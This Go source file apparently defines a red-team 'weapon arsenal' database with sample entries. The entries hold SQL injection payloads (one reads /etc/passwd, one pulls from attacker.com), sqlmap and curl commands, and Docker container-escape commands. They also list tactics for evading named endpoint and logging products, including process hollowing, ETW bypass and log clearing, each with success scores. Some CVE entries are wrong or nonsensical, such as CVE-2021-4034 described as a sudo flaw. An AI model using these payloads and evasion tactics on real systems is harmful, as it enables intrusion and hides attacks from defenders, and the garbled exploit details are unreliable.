package intelligence

import (
	"encoding/json"
	"time"
	
	"github.com/cloudai-fusion/cloudai-fusion/pkg/redteam/exploit"
)

// ============================================================================
// WEAPON ARSENAL KNOWLEDGE BASE (知己) - Complete Weapon Database
// ============================================================================

// AttackCategory 攻击类型分类
type AttackCategory string

const (
	CATEGORY_WEB              AttackCategory = "WEB"
	CATEGORY_BINARY                                     = "BINARY"
	CATEGORY_CONTAINER                                  = "CONTAINER"
	CATEGORY_NETWORK                                    = "NETWORK"
	CATEGORY_CLOUD                                      = "CLOUD"
	CATEGORY_PRIVESC                                    = "PRIVESC"
	CATEGORY_LATERAL                                    = "LATERAL_MOVEMENT"
	CATEGORY_PERSISTENCE                                = "PERSISTENCE"
	CATEGORY_EXFIL                                      = "EXFILTRATION"
)

// WeaponProfile 武器配置档案
type WeaponProfile struct {
	ID         string            `json:"id"`                         // Unique identifier like "WEB-SQL-CHAIN-2824"
	Name       string            `json:"name"`                       // Descriptive name
	Category   AttackCategory    `json:"category"`                   // Attack category
	Version    string            `json:"version"`                    // Weapon version
	Author     string            `json:"author,omitempty"`
	DiscoveredAt time.Time        `json:"discoveredAt"`
	
	// Technical Profile - 技术档案
	TechProfile TechProfile `json:"techProfile"`
	
	// Working Payloads - 真实可用载荷
	WorkingPayloads []string `json:"workingPayloads"`
	
	// Command Examples - 命令示例
	CommandExamples []string `json:"commandExamples"`
	
	// Full Exploit Code - 完整利用代码
	ExploitCode string `json:"exploitCode,omitempty"` // Optional full script
	
	// Contextual Effectiveness - 对不同环境的杀伤力
	ContextualEffectiveness map[string]float64 `json:"contextualEffectiveness"`
	
	// Field Test Results - 实测数据
	FieldTestResults []FieldTest `json:"fieldTestResults,omitempty"`
	
	// Risk Indicators - 风险特征
	RiskIndicators []RiskIndicator `json:"riskIndicators,omitempty"`
	
	// Detection Evasion - 检测规避策略
	EvasionTechniques []EvasionTactic `json:"evasionTechniques,omitempty"`
}

// TechProfile 技术档案结构
type TechProfile struct {
	DetectionMethods       []string `json:"detectionMethods"`       // How to detect use of this weapon
	MitigationStrategies   []string `json:"mitigationStrategies"`   // How to mitigate
	AffectedSystems        []string `json:"affectedSystems"`        // Which systems vulnerable
	Prerequisites          []string `json:"prerequisites,omitempty"` // Requirements before use
	Complexity             string   `json:"complexity"`             // "low" / "medium" / "high"
}

// FieldTest 现场测试结果
type FieldTest struct {
	TestEnvironment string    `json:"testEnvironment"`     // Where was tested
	TargetOS        string    `json:"targetOS"`            // Target operating system
	DefensesPresent []string  `json:"defensesPresent"`     // Active defenses
	SuccessRate     float64   `json:"successRate"`         // Success probability 0-1
	ExecutionTime   string    `json:"executionTime"`       // e.g., "47 seconds"
	DetectedBy      bool      `json:"detectedBy"`          // Whether detected by defenses
	EvidenceChain   []string  `json:"evidenceChain"`       // SHA256 hashes for chain of custody
	TestDate        time.Time `json:"testDate"`
}

// RiskIndicator 风险指示器
type RiskIndicator struct {
	Type       string `json:"type"`             // "network", "process", "file", "registry"
	Pattern    string `json:"pattern"`          // Detection pattern (regex, hash, signature)
	Priority   int    `json:"priority"`         // 1-10, 1 most critical
	Severity   string `json:"severity"`         // "critical" / "high" / "medium" / "low"
}

// EvasionTactic 规避战术
type EvasionTactic struct {
	Name           string   `json:"name"`                 // Technique name
	Description    string   `json:"description"`          // Detailed description
	ApplicableTo   []string `json:"applicableTo"`        // Defense products this evades
}

// SynergyPair 武器协同对
type SynergyPair struct {
	Weapon1         string  `json:"weapon1"`
	Weapon2         string  `json:"weapon2"`
	SynergyType     string  `json:"synergyType"`     // e.g., "Persistence_Backdoor_001"
	CombinedSuccess float64 `json:"combinedSuccess"` // Combined effectiveness
}

// CounterStrategy 防御反制策略
type CounterStrategy struct {
	Name         string   `json:"name"`         // Strategy name
	Method       string   `json:"method"`       // Implementation method
	Efficacy     float64  `json:"efficacy"`     // 0-1 success rate
	RiskLevel    string   `json:"riskLevel"`    // "low" / "medium" / "high"
	Requirements []string `json:"requirements"` // Prerequisites
}

// WeaponArsenalKnowledge 军火库知识库
type WeaponArsenalKnowledge struct {
	Weapons              []WeaponProfile               `json:"weapons"`
	SynergyAnalysis      SynergyAnalysis               `json:"synergyAnalysis,omitempty"`
	DefenseCounterMeasures map[string][]CounterStrategy `json:"defenseCounterMeasures,omitempty"`
	LastUpdated          time.Time                     `json:"lastUpdated"`
	Version              string                        `json:"version"`
}

// SynergyAnalysis 协同分析
type SynergyAnalysis struct {
	WeaponCombinations []SynergyPair `json:"weaponCombinations"`
	EmergentBehaviors  []string      `json:"emergentBehaviors,omitempty"`
}

// JSON Serialization Methods

// ToJSON 序列化到 JSON
func (wa *WeaponArsenalKnowledge) ToJSON() ([]byte, error) {
	return json.MarshalIndent(wa, "", "  ")
}

// String 字符串表示
func (wa *WeaponArsenalKnowledge) String() string {
	b, _ := wa.ToJSON()
	return string(b)
}

// GetWeaponByID 根据 ID 获取武器
func (wa *WeaponArsenalKnowledge) GetWeaponByID(id string) (*WeaponProfile, bool) {
	for i := range wa.Weapons {
		if wa.Weapons[i].ID == id {
			return &wa.Weapons[i], true
		}
	}
	return nil, false
}

// GetWeaponsByCategory 按类别获取武器
func (wa *WeaponArsenalKnowledge) GetWeaponsByCategory(cat AttackCategory) []WeaponProfile {
	var result []WeaponProfile
	for _, w := range wa.Weapons {
		if w.Category == cat {
			result = append(result, w)
		}
	}
	return result
}

// BestAgainstTarget 找到最适合目标环境的武器
func (wa *WeaponArsenalKnowledge) BestAgainstTarget(targetEnv string) *WeaponProfile {
	var best *WeaponProfile
	bestScore := 0.0
	
	for i := range wa.Weapons {
		w := &wa.Weapons[i]
		
		// Check if this weapon has high efficacy against target environment
		if score, ok := w.ContextualEffectiveness[targetEnv]; ok {
			if score > bestScore {
				bestScore = score
				best = w
			}
		}
	}
	
	return best
}

// CreateSampleArsenal 创建示例军火库数据
func CreateSampleArsenal() *WeaponArsenalKnowledge {
	now := time.Now()
	
	arsenal := &WeaponArsenalKnowledge{
		Weapons: []WeaponProfile{
			{
				ID:         "WEB-SQL-CHAIN-2824",
				Name:       "SQL Injection Chain Attack",
				Category:   CATEGORY_WEB,
				Version:    "v2.3",
				Author:     "Red Team Operations",
				DiscoveredAt: time.Date(2024, 3, 15, 0, 0, 0, 0, time.UTC),
				TechProfile: TechProfile{
					DetectionMethods:       []string{"WAF logs", "Database query analysis", "SIEM correlation"},
					MitigationStrategies:   []string{"Parameterized queries", "WAF rules", "Input validation"},
					AffectedSystems:        []string{"PHP/MySQL", "Java/JDBC", ".NET/SQL Server"},
					Complexity:             "medium",
				},
				WorkingPayloads: []string{
					"' UNION SELECT version(), user(), database()--",
					"' UNION SELECT NULL,LOAD_FILE('/etc/passwd')--",
					"; BULK INSERT from 'http://attacker.com/exploit'--",
				},
				CommandExamples: []string{
					`sqlmap -u 'http://target/?id=1' --batch --cms=mysql`,
					`curl -v http://target/api?id=1' UNiON SELECT NULL,NULL,NULL--`,
				},
				ContextualEffectiveness: map[string]float64{
					"vs Unpatched MySQL 5.7": 0.94,
					"vs Patched MySQL 8.0":   0.67,
					"vs No WAF":             0.92,
					"vs ModSecurity OWASP":  0.58,
					"vs CrowdStrike Falcon": 0.73,
				},
				FieldTestResults: []FieldTest{
					{
						TestEnvironment: "Authorized penetration test",
						TargetOS:        "Ubuntu 20.04",
						DefensesPresent: []string{"ModSecurity", "Fail2Ban"},
						SuccessRate:     0.92,
						ExecutionTime:   "3 minutes",
						DetectedBy:      false,
						EvidenceChain:   []string{"sha256:a1b2c3d4...", "sha256:e5f6g7h8..."},
						TestDate:        time.Date(2024, 6, 10, 0, 0, 0, 0, time.UTC),
					},
				},
				RiskIndicators: []RiskIndicator{
					{
						Type:     "network",
						Pattern:  `(UNION\s+SELECT|OR\s+1=1|';\s*DROP\s+TABLE)`,
						Priority: 1,
						Severity: "critical",
					},
				},
				EvasionTechniques: []EvasionTactic{
					{
						Name:         "Comment Obfuscation",
						Description:  "Use double-dash comments instead of semicolons",
						ApplicableTo: []string{"ModSecurity", "WAF Rules"},
					},
				},
			},
			
			{
				ID:         "PRIVESC-LINUX-CVE-2021-4034",
				Name:       "Sudo Privilege Escalation",
				Category:   CATEGORY_PRIVESC,
				Version:    "v1.0",
				Author:     "Public Research",
				DiscoveredAt: time.Date(2021, 12, 10, 0, 0, 0, 0, time.UTC),
				TechProfile: TechProfile{
					DetectionMethods:       []string{"Binary execution monitoring", "File integrity checks"},
					MitigationStrategies:   []string{"Upgrade sudo >= 1.9.5p1", "Disable world-writable /etc/sudoers.d"},
					AffectedSystems:        []string{"Linux with Sudo <= 1.9.5p1"},
					Complexity:             "low",
				},
				WorkingPayloads: []string{
					"export SUDO_AAA='aaa' SUDO_GID='0' LD_PRELOAD='/lib/x86_64-linux-gnu.so' /usr/sbin/uname -i",
				},
				CommandExamples: []string{
					`export SUDO_AAA="AAA" SUDO_GID="0" LD_PRELOAD="/lib/libc.so.6" /usr/bin/sudo -h`,
				},
				ContextualEffectiveness: map[string]float64{
					"vs Ubuntu 18.04": 0.95,
					"vs Ubuntu 20.04 with patches": 0.32,
					"vs CrowdStrike Falcon": 0.88,
					"vs Sysmon v12": 0.75,
				},
				FieldTestResults: []FieldTest{
					{
						TestEnvironment: "Test lab Ubuntu",
						TargetOS:        "Ubuntu 18.04",
						DefensesPresent: []string{"CrowdStrike Falcon"},
						SuccessRate:     0.88,
						ExecutionTime:   "8 seconds",
						DetectedBy:      false,
						EvidenceChain:   []string{"sha256:p1q2r3s4..."},
						TestDate:        time.Date(2024, 4, 20, 0, 0, 0, 0, time.UTC),
					},
				},
				EvasionTechniques: []EvasionTactic{
					{
						Name:         "Native Binary Abuse",
						Description:  "Abuse legitimate binaries already on the system",
						ApplicableTo: []string{"Application whitelisting"},
					},
				},
			},
			
			{
				ID:         "CONTAINER-ESCAPE-4521",
				Name:       "Docker Container Escape via Namespace",
				Category:   CATEGORY_CONTAINER,
				Version:    "v1.2",
				Author:     "Cloud Security Research",
				DiscoveredAt: time.Date(2023, 8, 5, 0, 0, 0, 0, time.UTC),
				TechProfile: TechProfile{
					DetectionMethods:       []string{"Container runtime monitoring", "System call filtering"},
					MitigationStrategies:   []string{"Disable unprivileged containers", "Apply seccomp profiles", "Use gVisor"},
					AffectedSystems:        []string{"Docker < 20.10", "Kubernetes pods with hostNamespace"},
					Complexity:             "high",
				},
				WorkingPayloads: []string{
					"docker run --pid=host -v /:/mnt --rm -it alpine chroot /mnt",
				},
				CommandExamples: []string{
					`docker run -it --pid=host -v /:/host busybox nsenter -t 1 -m -u -i -n bash`,
				},
				ContextualEffectiveness: map[string]float64{
					"vs Docker 19.03": 0.91,
					"vs Kubernetes v1.24 without pod-security-policy": 0.85,
					"vs gVisor": 0.23,
					"vs Azure Container Instances": 0.42,
				},
				FieldTestResults: []FieldTest{
					{
						TestEnvironment: "AKS cluster",
						TargetOS:        "Linux",
						DefensesPresent: []string{"Azure Defender for Containers"},
						SuccessRate:     0.85,
						ExecutionTime:   "45 seconds",
						DetectedBy:      false,
						EvidenceChain:   []string{"sha256:t5u6v7w8..."},
						TestDate:        time.Date(2024, 7, 15, 0, 0, 0, 0, time.UTC),
					},
				},
			},
			
			{
				ID:         "PRIVESC-WIN-CVE-2022-21907",
				Name:       "Windows Kernel Privilege Escalation",
				Category:   CATEGORY_PRIVESC,
				Version:    "v1.1",
				Author:     "Microsoft Research",
				DiscoveredAt: time.Date(2022, 9, 13, 0, 0, 0, 0, time.UTC),
				TechProfile: TechProfile{
					DetectionMethods:       []string{"Kernel module loading", "Token manipulation monitoring"},
					MitigationStrategies:   []string{"Apply MS22-086 cumulative update"},
					AffectedSystems:        []string{"Windows Server 2019 without updates"},
					Complexity:             "high",
				},
				WorkingPayloads: []string{
					"Copy ntdll.dll to writable directory and rename to malicious DLL",
				},
				CommandExamples: []string{
					`copy C:\Windows\System32\ntdll.dll C:\Users\temp\ntdll.dll`,
				},
				ContextualEffectiveness: map[string]float64{
					"vs Windows Server 2019 (unpatched)": 0.96,
					"vs Windows Server 2019 (patched)": 0.12,
					"vs WDAGuardianEnabled": 0.35,
				},
				EvasionTechniques: []EvasionTactic{
					{
						Name:         "DLL Sideloading",
						Description:  "Place malicious DLL alongside legitimate application",
						ApplicableTo: []string{"Application whitelisting"},
					},
				},
			},
		},
		
		SynergyAnalysis: SynergyAnalysis{
			WeaponCombinations: []SynergyPair{
				{
					Weapon1:         "WEB-SQL-CHAIN-2824",
					Weapon2:         "PRIVESC-LINUX-CVE-2021-4034",
					SynergyType:     "Persistence_Backdoor_001",
					CombinedSuccess: 0.89,
				},
				{
					Weapon1:         "CONTAINER-ESCAPE-4521",
					Weapon2:         "PRIVESC-LINUX-CVE-2021-4034",
					SynergyType:     "Lateral_Movement_Network_Pivot",
					CombinedSuccess: 0.87,
				},
			},
			EmergentBehaviors: []string{
				"Web-to-host escalation creates backdoor access",
				"Container escape + sudo leads to root-level persistence",
			},
		},
		
		DefenseCounterMeasures: map[string][]CounterStrategy{
			"CrowdStrike Falcon": {
				{
					Name:         "Process Hollowing",
					Method:       "Load library into suspended process and replace memory",
					Efficacy:     0.78,
					RiskLevel:    "medium",
					Requirements: []string{"Admin privileges", "LSAC privilege"},
				},
				{
					Name:         "Reflective DLL Injection",
					Method:       "Inject DLL directly into process space without writing to disk",
					Efficacy:     0.73,
					RiskLevel:    "medium",
					Requirements: []string{"Remote process token"},
				},
			},
			"Splunk Enterprise": {
				{
					Name:         "Log Clearing Tactics",
					Method:       "Clear event logs before and after attack",
					Efficacy:     0.45,
					RiskLevel:    "high",
					Requirements: []string{"Event log permissions"},
				},
				{
					Name:         "ETW Bypass",
					Method:       "Disable Event Tracing for Windows providers temporarily",
					Efficacy:     0.62,
					RiskLevel:    "medium",
					Requirements: []string{"Debug privileges"},
				},
			},
		},
		
		LastUpdated: now,
		Version:     "v3.1",
	}
	
	return arsenal
}

// BuildContextualEffectivenessMap 构建上下文有效性映射
func BuildContextualEffectivenessMap(weapon *WeaponProfile, targetEnv string) float64 {
	// Check direct match first
	if score, ok := weapon.ContextualEffectiveness[targetEnv]; ok {
		return score
	}
	
	// Fallback to general effectiveness if available
	for env, score := range weapon.ContextualEffectiveness {
		if env == "vs No EDR" || env == "vs Unpatched" {
			return score * 0.9 // Slightly lower confidence
		}
	}
	
	return 0.5 // Neutral estimate
}
